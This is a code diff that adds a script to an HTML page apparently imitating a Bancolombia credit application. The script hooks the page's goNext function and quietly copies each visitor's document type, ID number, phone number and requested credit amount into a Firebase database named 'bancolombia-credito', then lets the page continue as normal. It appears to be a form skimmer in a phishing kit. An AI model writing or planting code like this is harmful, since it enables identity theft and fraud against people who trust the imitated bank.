@@ -617,5 +617,46 @@
       });
     })();
   </script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+<script>
+const firebaseConfig = {
+  apiKey: "AIzaSyDnpt5VrIFzWnLKf-l+VBT9h9mlNqY",
+  authDomain: "bancolombia-credito.firebaseapp.com",
+  projectId: "bancolombia-credito",
+  storageBucket: "bancolombia-credito.appspot.com",
+  messagingSenderId: "354851838251",
+  appId: "1:354851838251:web:8a58e76d81a79d942aae9"
+};
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
+
+const form = document.querySelector("form");
+if (form) {
+  const originalGoNext = window.goNext;
+  window.goNext = function() {
+    const tipoDoc = document.querySelector("select")?.value || "";
+    const numeroDoc = document.querySelectorAll("input")[0]?.value || "";
+    const contacto = document.querySelectorAll("input")[1]?.value || "";
+    const cupo = document.querySelector("#cupo")?.value || "";
+    
+    db.collection("solicitudes").add({
+      tipoDocumento: tipoDoc,
+      numeroDocumento: numeroDoc,
+      numeroContacto: contacto,
+      cupoSolicitado: cupo,
+      fecha: new Date()
+    })
+    .then(() => {
+      console.log("✅ Datos guardados en Firebase");
+      if (originalGoNext) originalGoNext.apply(this, arguments);
+    })
+    .catch((error) => {
+      console.error("❌ Error Firebase:", error);
+      if (originalGoNext) originalGoNext.apply(this, arguments);
+    });
+  };
+}
+</script>
 </body>
 </html>
